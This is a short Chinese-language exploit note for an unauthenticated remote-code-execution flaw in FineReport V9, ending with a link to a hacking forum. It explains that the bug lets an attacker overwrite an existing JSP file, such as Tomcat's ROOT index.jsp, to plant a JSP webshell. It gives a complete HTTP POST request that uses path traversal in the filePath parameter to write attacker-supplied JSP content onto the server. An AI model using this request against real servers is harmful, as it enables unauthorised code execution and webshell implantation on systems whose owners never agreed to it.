# 帆软 V9未授权RCE漏洞


FineReport V9

注意: 这个漏洞是任意文件覆盖，上传 JSP 马，需要找已存在的 jsp 文件进行覆盖 Tomcat 启动帆软后默认存在的 JSP 文件:

比如:/tomcat-7.0.96/webapps/ROOT/index.jsp 覆盖 Tomcat 自带 ROOT 目录下的 index.jsp:


```
POST /WebReport/ReportServer?op=svginit&cmd=design_save_svg&filePath=chartmapsvg/../../../../WebReport/update.jsp  HTTP/1.1
Host: 192.168.10.1
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: JSESSIONID=DE7874FC92F0852C84D38935247D947F; JSESSIONID=A240C26B17628D871BB74B7601482FDE
Connection: close
Content-Type:text/xml;charset=UTF-8

Content-Length: 74

{"__CONTENT__":"<%out.println(\"Hello World!\");%>","__CHARSET__":"UTF-8"}
```

https://forum.ywhack.com/thread-115389-1-6.html